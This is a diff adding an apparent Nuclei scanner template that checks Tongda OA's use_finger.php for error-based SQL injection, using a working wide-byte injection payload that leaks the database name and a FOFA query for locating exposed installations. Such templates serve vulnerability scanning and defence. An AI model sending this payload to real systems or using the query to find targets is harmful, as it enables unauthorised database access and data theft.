@@ -1,0 +1,24 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - 'XPATH syntax error:'
+    - use_finger.php
+  method: GET
+  path:
+  - '{{BaseURL}}/inc/finger/use_finger.php?USER_ID=-123%df''and extractvalue(1, concat(0x5c,(database())))%23'
+id: tongda-oa-use-finger-sqli
+info:
+  author: Co5mos
+  description: "\u901A\u8FBEOA\u7684 `/use_finger.php` \u63A5\u53E3\u5B58\u5728\u62A5\
+    \u9519\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528\
+    \u8BE5\u6F0F\u6D1E\u6267\u884C\u4EFB\u610FSQL\u8BED\u53E5\uFF0C\u4ECE\u800C\u83B7\
+    \u53D6\u6570\u636E\u5E93\u4E2D\u7684\u654F\u611F\u4FE1\u606F\u6216\u63A7\u5236\
+    \u6570\u636E\u5E93\u670D\u52A1\u5668\u3002\n"
+  metadata:
+    fofa-query: "app=\"TDXK-\u901A\u8FBEOA\""
+  name: Tongda OA use_finger.php SQL Injection
+  severity: critical
+  tags: tongda, sqli
